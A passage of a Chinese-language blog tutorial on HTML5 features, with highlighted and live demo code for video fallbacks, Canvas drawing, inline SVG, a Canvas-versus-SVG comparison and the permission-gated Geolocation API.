operator">=</span><span class="token number">320</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">420</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> </code></pre><h4 id="更好的方案-1"><a href="#更好的方案-1" class="headerlink" title="更好的方案"></a>更好的方案</h4><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>movie.swf<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></code></pre><p>使用了 4 种不同的视频格式。HTML 5 <code>&lt;video&gt;</code> 元素会尝试播放以 mp4、ogg 或 webm 格式中的一种来播放视频。如果均失败，则回退到 <code>&lt;embed&gt;</code> 元素。</p><p>当然，如果还不行，可以<strong>把视频上传到各大视频网站</strong>，然后<strong>嵌入视频</strong>就完事了。</p><hr><h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><p>HTML5 的 canvas 元素使用 JavaScript 在网页上<strong>绘制图像</strong>。</p><p>画布是一个矩形区域，您可以控制其每一像素。</p><p>canvas 拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。</p><h3 id="创建-canvas"><a href="#创建-canvas" class="headerlink" title="创建 canvas"></a>创建 canvas</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvasTest<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span></code></pre><p>canvas 元素本身是没有绘图能力的。所有的绘制工作必须在 JavaScript 内部完成。</p><p>比如绘制一个红色的矩形。</p><p>其中，<code>getContext("2d")</code> 对象是内建的 HTML5 对象，拥有多种绘制路径、矩形、圆形、字符以及添加图像的方法。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvasTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><canvas id="myCanvasTest" width="200" height="100"></canvas></p><script type="text/javascript">var c=document.getElementById("myCanvasTest");var cxt=c.getContext("2d");cxt.fillStyle="#FF0000";cxt.fillRect(0,0,150,75);</script><br><h3 id="坐标"><a href="#坐标" class="headerlink" title="坐标"></a>坐标</h3><p>左上角为 (0,0)，左到右为x轴正方向，上到下为y轴正方向，如下图所示。</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/canvas_coordinates.gif" alt="Canvas：理解坐标"></p><p>这里有个示例↓。</p><script type="text/javascript"> function cnvs_getCoordinates(e){x=e.clientX;y=e.clientY;document.getElementById("xycoordinates").innerHTML="Coordinates: (" + x + "," + y + ")";}function cnvs_clearCoordinates(){document.getElementById("xycoordinates").innerHTML="";}</script><p>把鼠标悬停在下面的矩形上可以看到坐标：</p><div id="coordiv" style="float:left;width:199px;height:99px;border:1px solid #c3c3c3" onmousemove="cnvs_getCoordinates(event)" onmouseout="cnvs_clearCoordinates()"></div><br><div id="xycoordinates"></div><br><br><h3 id="绘制线条"><a href="#绘制线条" class="headerlink" title="绘制线条"></a>绘制线条</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas1<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">lineTo</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">lineTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><canvas id="myCanvas" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas");    var cxt=c.getContext("2d");    cxt.moveTo(10,10);    cxt.lineTo(150,50);    cxt.lineTo(10,50);    cxt.stroke();</script><br><h3 id="绘制圆形"><a href="#绘制圆形" class="headerlink" title="绘制圆形"></a>绘制圆形</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas2<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>Math<span class="token punctuation">.</span>PI<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">closePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><canvas id="myCanvas2" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">var c=document.getElementById("myCanvas2");var cxt=c.getContext("2d");cxt.fillStyle="#FF0000";cxt.beginPath();cxt.arc(70,18,15,0,Math.PI*2,true);cxt.closePath();cxt.fill();</script><br><h3 id="绘制渐变背景"><a href="#绘制渐变背景" class="headerlink" title="绘制渐变背景"></a>绘制渐变背景</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas3<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> grd<span class="token operator">=</span>cxt<span class="token punctuation">.</span><span class="token function">createLinearGradient</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    grd<span class="token punctuation">.</span><span class="token function">addColorStop</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"#FF0000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    grd<span class="token punctuation">.</span><span class="token function">addColorStop</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"#00FF00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>grd<span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><canvas id="myCanvas3" width="200" height="100" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas3");    var cxt=c.getContext("2d");    var grd=cxt.createLinearGradient(0,0,175,50);    grd.addColorStop(0,"#FF0000");    grd.addColorStop(1,"#00FF00");    cxt.fillStyle=grd;    cxt.fillRect(0,0,175,50);</script><br><h3 id="放置图像"><a href="#放置图像" class="headerlink" title="放置图像"></a>放置图像</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myCanvas4<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">border</span><span class="token punctuation">:</span><span class="token number">1</span>px solid <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> img<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    img<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"FrontEnd_HTML_Advanced/start_again.jpg"</span>    cxt<span class="token punctuation">.</span><span class="token function">drawImage</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><canvas id="myCanvas4" width="200" height="200" style="border:1px solid #c3c3c3;">    Your browser does not support the canvas element.</canvas><script type="text/javascript">    var c=document.getElementById("myCanvas4");    var cxt=c.getContext("2d");    var img=new Image()    img.src="FrontEnd_HTML_Advanced/start_again.jpg"    cxt.drawImage(img,0,0);</script><br><hr><h2 id="内联-SVG"><a href="#内联-SVG" class="headerlink" title="内联 SVG"></a>内联 SVG</h2><p>SVG 指可伸缩矢量图形 (Scalable Vector Graphics)，用于定义用于网络的基于矢量的图形。<br>SVG 使用 XML 格式定义图形。SVG 图像在放大或改变尺寸的情况下其图形质量不会有损失。<br>SVG 是万维网联盟的标准。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>190<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>polygon</span> <span class="token attr-name">points</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100,10 40,180 190,60 10,60 160,180<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name">  <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">fill</span><span class="token punctuation">:</span>lime<span class="token punctuation">;</span><span class="token property">stroke</span><span class="token punctuation">:</span>purple<span class="token punctuation">;</span><span class="token property">stroke-width</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token property">fill-rule</span><span class="token punctuation">:</span>evenodd<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span></code></pre><svg xmlns="http://www.w3.org/2000/svg" version="1.1" height="190">  <polygon points="100,10 40,180 190,60 10,60 160,180" style="fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;"></polygon></svg><br><p>SVG 本身就挺复杂的，也很强大，有专门的教程来学这个。</p><p>不过目前来说我还用不到呢，后面感兴趣再慢慢看吧。</p><hr><h2 id="Canvas-VS-SVG"><a href="#Canvas-VS-SVG" class="headerlink" title="Canvas VS SVG"></a>Canvas VS SVG</h2><h3 id="Canvas-1"><a href="#Canvas-1" class="headerlink" title="Canvas"></a>Canvas</h3><p>Canvas 通过 <strong>JavaScript</strong> 来绘制 2D 图形。</p><p>Canvas <strong>逐像素进行渲染</strong>。</p><p>在 canvas 中，一旦图形被绘制完成，它就<strong>不会</strong>继续得到浏览器的关注。</p><p>如果其位置发生变化，那么<strong>整个场景也需要重新绘制</strong>，包括任何或许已被图形覆盖的对象。</p><ul><li>依赖分辨率</li><li>不支持事件处理器</li><li>弱的文本渲染能力</li><li>能够以 .png 或 .jpg 格式保存结果图像</li><li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li></ul><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>SVG 是一种使用 <strong>XML</strong> 描述 2D 图形的语言。</p><p>SVG 基于 XML，这意味着 SVG DOM 中的<strong>每个元素都是可用的</strong>。<strong>可以为某个元素附加 JavaScript 事件处理器。</strong></p><p>在 SVG 中，每个被绘制的图形均被视为<strong>对象</strong>。如果 SVG 对象的属性发生变化，那么浏览器<strong>能够自动重现图形</strong>。</p><ul><li>不依赖分辨率</li><li>支持事件处理器</li><li>最适合带有大型渲染区域的应用程序（比如谷歌地图）</li><li>复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快）</li><li>不适合游戏应用</li></ul><hr><h2 id="地理定位"><a href="#地理定位" class="headerlink" title="地理定位"></a>地理定位</h2><p>HTML5 提供了一个获取用户位置信息的API。</p><p>当然这个需要用户的许可才行。</p><p><code>getCurrentPosition()</code> 方法可以用来获得用户的位置。如果能正常调用的话，会返回如下信息。</p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>coords.latitude</td><td>十进制数的纬度</td></tr><tr><td>coords.longitude</td><td>十进制数的经度</td></tr><tr><td>coords.accuracy</td><td>位置精度</td></tr><tr><td>coords.altitude</td><td>海拔，海平面以上以米计</td></tr><tr><td>coords.altitudeAccuracy</td><td>位置的海拔精度</td></tr><tr><td>coords.heading</td><td>方向，从正北开始以度计</td></tr><tr><td>coords.speed</td><td>速度，以米/每秒计</td></tr><tr><td>timestamp</td><td>响应的日期/时间</td></tr></tbody></table><p>如果getCurrentPosition()运行成功，则向参数showPosition中规定的函数返回一个coordinates对象。</p><p>showPosition() 函数获得并显示经度和纬度。</p><p>getCurrentPosition() 方法的第二个参数用于<strong>处理错误</strong>。它规定当获取用户位置失败时运行的函数。<em>（类似于回调函数？）</em></p><p>showError() 函数用于处理错误。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>geolocation_demo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>点击这个按钮，将显示您的坐标：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getLocation()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>试一下<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">var</span> x<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"geolocation_demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">getLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>geolocation<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            navigator<span class="token punctuation">.</span>geolocation<span class="token punctuation">.</span><span class="token function">getCurrentPosition</span><span class="token punctuation">(</span>showPosition<span class="token punctuation">,</span> showError<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Geolocation is not supported by this browser."</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">showPosition</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Latitude: "</span> <span class="token operator">+</span> position<span class="token punctuation">.</span>coords<span class="token punctuation">.</span>latitude <span class="token operator">+</span>             <span class="token string">"&lt;br />Longitude: "</span> <span class="token operator">+</span> position<span class="token punctuation">.</span>coords<span class="token punctuation">.</span>longitude<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">showError</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>error<span class="token punctuation">.</span>code<span class="token punctuation">)</span>         <span class="token punctuation">{</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span>PERMISSION_DENIED<span class="token punctuation">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"User denied the request for Geolocation."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span>POSITION_UNAVAILABLE<span class="token punctuation">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"Location information is unavailable."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span>TIMEOUT<span class="token punctuation">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"The request to get user location timed out."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> error<span class="token punctuation">.</span>UNKNOWN_ERROR<span class="token punctuation">:</span>                x<span class="token punctuation">.</span>innerHTML<span class="token operator">=</span><span class="token string">"An unknown error occurred."</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p id="geolocation_demo">点击这个按钮，将显示您的坐标：</p><button onclick="getLocation()">试一下</button><script>    var x=document.getElementById("geolocation_demo");    function getLocation()    {        if (navigator.geolocation)        {            navigator.geolocation.getCurrentPosition(showPosition, showError);        }        else{x.innerHTML="Geolocation is not supported by this browser.";}    }    function showPosition(position)    {        x.innerHTML="Latitude: " + position.coords.latitude +             "<br />Longitude: " + position.coords.longitude;        }    function showError(error)    {        switch(error.code)         {            case error.PERMISSION_DENIED:                x.innerHTML="User denied the request for Geolocation."                break;            case error.POSITION_UNAVAILABLE:                x.innerHTML="Location information is unavailable."                break;            case error.TIMEOUT:                x.innerHTML="The request to get user location timed out."                break;            case error.UNKNOWN_ERROR:                x.innerHTML="An unknown error occurred."                break;        }    }</script><br><p>如需<strong>在地图中显示结果</strong>，可以调用谷歌地图、百度地图等地图的API。</p><p>还有一些其他的方法：</p><p><strong>watchPosition()</strong> </p><p>返回用户的当前位置，并继续返回用户移动时的更新位置（类似于 GPS）。</p><p><strong>clearWatch()</strong> </p><p>停止 watchPosition() 方法。</p><hr><h2 id="拖放"><a href="#拖放" 